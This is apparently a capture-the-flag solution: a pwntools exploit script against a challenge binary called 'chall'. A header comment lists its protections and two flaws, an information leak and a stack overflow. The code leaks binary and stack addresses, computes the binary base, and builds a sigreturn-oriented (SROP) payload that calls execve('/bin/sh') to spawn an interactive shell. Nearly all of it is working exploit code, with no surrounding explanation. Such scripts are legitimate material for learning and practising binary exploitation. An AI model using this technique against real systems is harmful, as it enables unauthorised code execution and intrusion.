from pwn import *


'''
RELRO           Full RELRO          
STACK CANARY    No canary found   
NX              NX enabled         
PIE             PIE enabled       

program written in assembly (not libc)

Vulnerabilities: 
    - the function skip_determine_len write to stdout 
    using the size given by the user (free binary and stack leak)

    - the function _read_and_print_str read up to 0x512 bytes
    in a buffer of size 512 (classic stack overflow)


exploitation: 
    no gadgets are available to control rsi,rdi,rdx
    SROP for the fun


'''
context.arch='amd64'

padding=520
r= process("chall")
r.sendlineafter(b'>',b'1900')

sleep(0.3)
r.sendlineafter(b'>',b'A'*100)

sleep(0.3)
leaked = r.recvuntil(b"-")[:].strip()

all_leaks = [hex(u64(leaked[i:i+8].ljust(8,b'\x00'))) for i in range(0,len(leaked)+1,8)] 
for i in range(len(all_leaks)):
    print(i, all_leaks[i])

start_add = all_leaks[41] # leak address of _start
binary_base = int(start_add,16)-0x0000000000001118

print("[*] binary base", hex(binary_base))

# gdb.attach(r, gdbscript='''
# b* _read_and_print_str+37
# ''')


BINSH = int(all_leaks[63],16)+16-224 # offset 63 leak of stack address

SYSCALL_RET = binary_base + 0x0000000000001034 #syscall ; leave ; ret
frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET


payload = b'/bin/sh\x00'*65
payload+=p64(SYSCALL_RET)
payload+=bytes(frame)
payload+=b'/bin/sh\x00'*200

r.sendlineafter(b'>',b"15")
r.sendlineafter(b'>', payload)
r.interactive()